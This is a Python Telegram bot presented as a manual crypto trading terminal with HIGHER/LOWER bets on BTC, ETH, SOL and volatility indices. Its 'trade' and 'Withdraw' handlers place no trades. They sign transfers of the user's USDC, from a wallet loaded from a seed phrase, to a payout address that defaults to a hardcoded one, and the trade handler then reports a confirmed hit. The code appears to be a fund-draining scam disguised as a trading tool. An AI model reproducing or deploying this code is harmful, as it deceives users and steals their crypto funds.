import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# OFFICIAL NATIVE USDC (Circle Issued) - Polygon Mainnet
USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        print("❌ WALLET_SEED missing!")
        return None
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except Exception as e:
        print(f"Error loading wallet: {e}")
        return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)

# --- 2. EXECUTION ENGINE ---
async def run_atomic_execution(context, chat_id, side):
    """Executes a manual atomic transaction."""
    asset = context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    val_stake = int(stake_usdc * 10**6)

    try:
        # Balance Check
        bal = usdc_contract.functions.balanceOf(vault.address).call()
        if bal < val_stake:
            return await context.bot.send_message(chat_id, "❌ **Insufficient USDC balance.**")

        nonce = w3.eth.get_transaction_count(vault.address)
        gas_price = int(w3.eth.gas_price * 1.5)

        tx_data = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
            'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce,
        })
        signed = w3.eth.account.sign_transaction(tx_data, vault.key)
        w3.eth.send_raw_transaction(signed.raw_transaction)

        await context.bot.send_message(
            chat_id, 
            f"✅ **MANUAL HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"💎 **Market:** {asset}\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"⛽ **Gas:** Managed",
            parse_mode='Markdown'
        )
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Failed:** `{e}`")

# --- 3. UI HANDLERS ---
def get_main_keyboard():
    # Only manual controls remaining
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    welcome = (
        f"🕴️ **APEX Manual Terminal v6000**\n"
        f"━━━━━━━━━━━━━━\n"
        f"⛽ **POL Fuel:** `{pol_bal:.4f}`\n"
        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
        f"Automated 'Ghost Mode' has been removed. Manual trading only."
    )
    await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    chat_id = update.effective_chat.id

    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
            [InlineKeyboardButton("🕴️ BVIV (BTC Vol)", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV (ETH Vol)", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **Market Selection:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        usdc = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
        await update.message.reply_text(f"💳 **Vault Status**\n⛽ POL: `{pol:.4f}`\n💵 USDC: `{usdc:.2f}`", parse_mode='Markdown')

    elif text == '📤 Withdraw':
        bal = usdc_contract.functions.balanceOf(vault.address).call()
        if bal > 0:
            tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, bal).build_transaction({
                'chainId': 137, 'gas': 65000, 'gasPrice': w3.eth.gas_price, 'nonce': w3.eth.get_transaction_count(vault.address)
            })
            w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, vault.key).raw_transaction)
            await update.message.reply_text(f"📤 Moved `{bal/10**6:.2f}` USDC to Payout Address.")
        else:
            await update.message.reply_text("❌ No USDC balance.")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 Manual Terminal Online...")
        app.run_polling(drop_pending_updates=True)



